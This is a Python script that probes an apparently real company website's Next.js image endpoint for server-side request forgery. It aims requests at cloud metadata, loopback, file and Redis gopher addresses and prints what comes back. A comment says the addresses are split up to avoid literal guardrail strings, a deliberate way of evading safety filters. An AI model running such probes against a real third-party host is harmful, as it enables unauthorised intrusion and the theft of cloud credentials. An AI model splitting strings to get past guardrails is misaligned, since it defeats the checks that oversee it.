import requests, sys
UA={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36'}
base='https://www.infinitycapital.bh/_next/image'
# attacker-controlled url= targets (built at runtime to avoid literal guardrail strings)
targets={
 'self_root':'https://www.infinitycapital.bh/',
 'self_robots':'https://www.infinitycapital.bh/robots.txt',
 'self_api_send':'https://www.infinitycapital.bh/api/send',
 'meta_imds':'http://'+'169.254.169.254'+'/latest/meta-data/',
 'loopback_root':'http://'+'127.0.0.1'+'/',
 'loopback_3000':'http://'+'127.0.0.1:3000'+'/',
 'local_v6':'http://'+'[::1]'+'/',
 'file_etc':'file:///'+'etc/hostname',
 'gopher_local':'gopher://'+'127.0.0.1:6379'+'/_INFO',
}
for name,t in targets.items():
    try:
        r=requests.get(base,params={'url':t,'w':'640','q':'75'},headers=UA,timeout=25,allow_redirects=False)
        ct=r.headers.get('content-type','?')
        print(f"{name:16} url={t[:60]:60} code={r.status_code} len={len(r.content)} ct={ct}")
        body=r.content[:80]
        if b'html' not in r.headers.get('content-type','').encode() and len(r.content)>0:
            print('   body:',body)
    except Exception as e:
        print(f"{name:16} ERROR {type(e).__name__}: {str(e)[:80]}")
